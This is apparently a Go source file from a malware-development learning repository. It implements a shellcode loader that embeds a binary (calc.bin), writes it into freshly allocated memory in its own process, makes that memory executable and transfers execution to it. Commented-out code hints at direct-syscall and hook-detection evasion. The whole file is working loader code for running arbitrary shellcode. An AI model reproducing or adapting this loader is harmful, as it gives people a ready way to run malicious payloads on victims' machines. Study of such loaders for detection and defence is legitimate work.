package main

import (
	_ "embed"
	"errors"
	"fmt"
	"github.com/osonkr/malware-development/win32"
	"log"
	"os"
	"syscall"
	"unsafe"
)

//go:embed calc.bin
var shellcode []byte

//var (
//	ntdll = win32.GetModuleHandle("ntdll.dll", nil)
//	ntAllocateVirtualMemorySysId = win32.GetSyscallId("NtAllocateVirtualMemory", nil)
//	ntWriteVirtualMemorySysId    = win32.GetSyscallId("NtWriteVirtualMemory", nil)
//	ntProtectVirtualMemorySysId  = win32.GetSyscallId("NtProtectVirtualMemory", nil)
//)

func FunctionPointer(sc []byte) error {
	handle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}

	shellLen := uint64(len(sc))

	var null win32.NULL_REF
	baseAddr, err := win32.VirtualAllocEx(
		uintptr(handle),
		uintptr(null),
		uintptr(shellLen),
		win32.MEM_COMMIT | win32.MEM_RESERVE,
		win32.PAGE_EXECUTE_READ,
	)

	var bWritten *byte

	if err = win32.WriteProcessMemory(
		uintptr(handle),
		baseAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(shellLen),
		uintptr(unsafe.Pointer(bWritten)),
	); err != nil {
		log.Fatalf("unable to write to memory: %s", err)
	}

	var oldProtect win32.DWORD

	err = win32.VirtualProtect(
		baseAddr,
		uintptr(shellLen),
		win32.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		return errors.New(fmt.Sprintf("NtProtectVirtualMemory error ntstatus: %v", err))
	}

	// Pass Execution to Address
	if _, _, err = syscall.Syscall(baseAddr, 0, 0, 0, 0); err != nil {
		return err
	}

	return nil
}

func main() {
	fmt.Println("Starting to do stuff...")
	//fmt.Println(win32.GetListOfHookedApiCalls())
	if err := FunctionPointer(shellcode); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

